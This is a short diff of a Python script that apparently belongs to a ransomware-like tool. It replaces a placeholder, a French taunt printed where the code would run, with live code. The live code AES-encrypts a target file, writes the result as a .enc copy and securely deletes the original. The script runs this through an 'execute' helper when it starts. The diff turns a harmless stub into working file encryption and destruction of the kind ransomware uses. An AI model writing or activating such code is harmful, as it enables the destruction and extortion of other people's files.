@@ -1,3 +1,4 @@
+import os
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 from commands.execute import execute
@@ -22,12 +23,11 @@ def encrypt_file(file_path, key):
     return ciphertext
 
 def encrypt_and_delete(file_path, key):
-    print('JE VAIS TOUT KC AHAHAH')
-    # ciphertext = encrypt_file(file_path, key)
-    # encrypted_file_path = file_path + ".enc"
-    # with open(encrypted_file_path, 'wb') as f:
-    #     f.write(ciphertext)
-    # secure_delete(file_path)
+    ciphertext = encrypt_file(file_path, key)
+    encrypted_file_path = file_path + ".enc"
+    with open(encrypted_file_path, 'wb') as f:
+        f.write(ciphertext)
+    secure_delete(file_path)
 
 if __name__ == '__main__':
     isCrypted = execute(encrypt_and_delete)
